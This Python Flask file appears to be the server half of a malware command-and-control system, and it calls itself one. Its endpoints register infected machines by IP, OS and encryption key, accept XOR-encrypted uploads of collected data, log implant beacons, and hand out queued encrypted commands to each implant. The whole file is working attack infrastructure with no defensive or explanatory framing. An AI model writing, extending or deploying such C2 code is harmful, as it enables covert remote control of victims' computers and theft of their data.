from flask import Flask, request
import uuid
import fileOps
import encode
import json

app = Flask(__name__)

@app.route("/clients")
def all_clients():
    return fileOps.get_malwares()

@app.route("/logs")
def get_log():
    
    return "this is a log"

@app.route("/upload", methods=['POST'])
def connect():

    json_payload = request.get_json()

    key = fileOps.get_enc_key(json_payload["id"])

    dec = encode.xor_decrypt(json_payload['data'], key)

    data_json = json.loads(dec)

    fileOps.add_log(data_json)
    return "this is a log"

@app.route("/register", methods=['POST'])
def registry():

    json_payload = request.get_json()

    dec = encode.decrypt_message_priv(json_payload['data'])
    
    data_json = json.loads(dec)

    malwareRegistry = str(encode.generate_id(data_json['OS']))

    print(malwareRegistry)

    malware_entry = {
        "id": malwareRegistry,
        "ip": request.remote_addr,
        "os_signature": data_json['OS'],
        "key": data_json['key']
    }
    
    fileOps.add_malware(malware_entry)

    return malwareRegistry
    

@app.route("/becon", methods=['POST'])
def becon():

    json_payload = request.get_json()

    key = fileOps.get_enc_key(json_payload["id"])

    dec = encode.xor_decrypt(json_payload['data'], key)

    data_json = json.loads(dec)
          
    print(data_json)

    fileOps.update_becon(data_json["id"], data_json["timestamp"])
    return ""

@app.route("/command", methods=['POST', 'GET'])
def command():
    if request.method == 'GET':
        form_data = request.form.to_dict()

        cmd = fileOps.get_command(form_data["id"])


        if not cmd:
            return "none"
        else:

            json_payload = {
            "cmd": cmd[0]
            }

            key = fileOps.get_enc_key(form_data["id"])
            enc_json = encode.xor_encrypt(json.dumps(json_payload) , key)

            return enc_json
    else:
        fileOps.post_command(request.get_json())

        return "post succsesful"
    

if __name__ == "__main__":
    app.run(debug=True)

